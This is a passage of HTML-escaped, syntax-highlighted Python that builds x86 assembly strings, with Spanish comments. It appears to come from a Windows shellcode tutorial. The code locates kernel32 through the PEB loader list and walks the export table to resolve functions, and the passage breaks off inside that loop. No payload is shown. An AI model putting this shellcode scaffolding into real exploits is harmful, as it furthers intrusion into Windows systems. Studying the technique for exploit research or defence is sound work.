&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;start:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;int3;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; breakpoint
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebp, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; stack frame
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;sub esp, 0x200;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Se reserva 0x200 
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call find_kernel32;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call find_function;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;    
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;   &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_kernel32:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;          &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; null
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, fs:[ecx+30h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; PEB       
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi+0Ch];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; PEB -&amp;gt; Ldr    
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi+1Ch];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Ldr -&amp;gt; InInitializationOrderModuleList
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;   &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;next_module:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebx, [esi+8h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; base_name
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov edi, [esi+20h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; module_name
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Siguiente (flink) 
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;cmp [edi+12*2], cx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; (unicode) module_name[12] == 0x00? 
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jne next_module;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; No? -&amp;gt; siguiente modulo  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ret;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;pushad;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guardar todos los registros
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov eax, [ebx + 0x3c];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Offset a PE Header
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov edi, [ebx + eax + 0x78];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; RVA de Export Table
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add edi, ebx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; VMA de Export Table
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ecx, [edi + 0x18];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; NumberOfNames
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov eax, [edi + 0x20];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; RVA de AddressOfNames
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add eax, ebx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; VMA de AddressOfNames
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp - 4], eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;           &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guardar AddressOfNames
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_loop:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jecxz find_function_finished;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Si ECX == 0, salir
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;dec ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Contador
